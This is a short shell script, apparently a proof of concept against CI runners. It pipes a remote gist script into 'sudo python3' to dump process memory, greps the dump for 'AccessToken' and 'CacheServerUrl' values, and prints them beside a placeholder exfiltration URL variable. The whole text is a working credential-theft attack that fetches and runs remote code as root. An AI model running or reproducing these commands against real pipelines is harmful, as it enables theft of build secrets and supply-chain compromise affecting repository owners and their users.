YOUR_EXFIL="your-exfil-url.com"
BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
BLOB2=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"CacheServerUrl":"[^"]*"\}' | sort -u`
echo $BLOB;
echo $BLOB2;
